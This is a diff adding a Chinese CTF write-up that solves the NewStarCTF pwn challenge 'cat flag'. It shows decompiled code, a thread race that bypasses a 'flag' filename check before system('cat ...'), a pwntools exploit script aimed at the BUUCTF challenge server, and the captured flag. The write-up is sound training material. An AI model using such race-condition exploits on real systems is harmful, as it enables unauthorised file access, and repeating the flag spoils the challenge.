@@ -3471,6 +3471,156 @@ io.interactive()
 
 ------
 
+### cat flag
+
+先`file ./pwn `查看文件类型，再`checksec --file=./pwn`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/cat flag]
+└─$ file ./pwn
+./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5e9560a621c83466c0a8427a73c1de760af1fe40, for GNU/Linux 3.2.0, not stripped
+
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/cat flag]
+└─$ checksec --file=./pwn
+[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/cat flag/pwn'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  init(argc, argv, envp);
+  menu();
+}
+```
+
+双击`menu()`函数查看详情，发现程序有`4`个功能。
+
+```c
+void __noreturn menu()
+{
+  int v0; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v1; // [rsp+8h] [rbp-8h]
+
+  v1 = __readfsqword(0x28u);
+  v0 = 0;
+  while ( 1 )
+  {
+    puts("\nchoose a command you want to execute.\n");
+    puts("1-ls");
+    puts("2-cat");
+    puts("3-mv");
+    puts("4-exit");
+    printf("==>");
+    __isoc99_scanf("%d", &v0);
+    getchar();
+    if ( v0 == 4 )
+      break;
+    if ( v0 <= 4 )
+    {
+      switch ( v0 )
+      {
+        case 3:
+          editname();
+          break;
+        case 1:
+          ls();
+          break;
+        case 2:
+          cat();
+          break;
+      }
+    }
+  }
+  exit(0);
+}
+```
+
+双击`ls()`函数查看详情，系统调用`ls`功能。
+
+```c
+int ls()
+{
+  return system("ls");
+}
+```
+
+双击`cat()`函数查看详情，先是输入一个文件名，如果文件名中不包含`.`和`/`的话，就开启一个新线程执行`cating`函数。
+
+```c
+int cat()
+{
+  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF
+
+  newthread[1] = __readfsqword(0x28u);
+  puts("Input the file name you want to cat.");
+  read(0, name, 0x14uLL);
+  if ( strchr(name, '.') || strchr(name, '/') )
+    return printf("You bad bad~");
+  name[strlen(name) - 1] = 0;
+  if ( access(name, 0) )
+    puts("The file does not exist");
+  else
+    pthread_create(newthread, 0LL, cating, 0LL);
+  return 0;
+}
+```
+
+`cating`函数首先判断输入的文件名`name`是否包含子串`"flag"`，如果包含`"flag"`的话就不打印文件，否则休息`1`秒后再打印文件。
+
+```c
+int __fastcall cating(void *a1)
+{
+  char dest[8]; // [rsp+0h] [rbp-20h] BYREF
+  __int64 v3; // [rsp+8h] [rbp-18h]
+  __int64 v4; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v5; // [rsp+18h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  if ( strstr(name, "flag") )
+    return puts("nonono,you don't have permission to cat this file!");
+  *(_QWORD *)dest = 544498019LL;
+  v3 = 0LL;
+  v4 = 0LL;
+  sleep(1u);
+  strcat(dest, name);
+  system(dest);
+  return 0;
+}
+```
+
+返回`menu()`函数，双击`editname()`函数查看详情。
+
+```c
+ssize_t editname()
+{
+  puts("Input new name you want to change.");
+  return read(0, name, 0x14uLL);
+}
+```
+
+因为`cat`函数打印文件时开启了新线程，所以我们在调用`cat`函数后再修改`name`中的内容时，线程中`name`的内容也能随之改变。编写`Python`代码求解得到`flag{c35c2250-d53a-4ccf-bd23-ca83bd33c38c}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 25260)
+io.sendlineafter(b'==>', b'2')
+io.sendlineafter(b'Input the file name you want to cat.\n', b'bin')
+io.sendlineafter(b'==>', b'3')
+io.sendlineafter(b'Input new name you want to change.\n', b'flag')
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
